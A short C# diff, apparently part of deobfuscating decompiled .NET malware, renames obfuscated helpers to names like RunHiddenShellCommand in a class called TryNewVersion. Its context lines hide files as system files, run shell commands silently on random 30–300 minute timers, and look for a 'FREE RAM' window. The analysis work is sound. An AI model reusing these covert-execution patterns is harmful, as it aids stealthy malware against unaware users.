@@ -898,7 +898,7 @@ public class TryNewVersion : Form
 					CommonUtility.smethod_21(array3[num3].string_0, FileAttributes.Hidden | FileAttributes.System);
 					if (array3[num3].bool_0)
 					{
-						WindowsInteropHelper.smethod_5(array3[num3].string_0);
+						WindowsInteropHelper.RunHiddenShellCommand(array3[num3].string_0);
 					}
 					int_1 = random.Next(30, 300) * 60 * 1000;
 				}
@@ -990,7 +990,7 @@ public class TryNewVersion : Form
 		try
 		{
 			int int_ = WindowsInteropHelper.FindFirstProcessIdByName("fr.bpl");
-			string text = WindowsInteropHelper.smethod_25(int_, "FREE RAM");
+			string text = WindowsInteropHelper.BuildMatchingTopLevelWindowHandleList(int_, "FREE RAM");
 			if (text != "")
 			{
 				string[] array = text.Split(';');
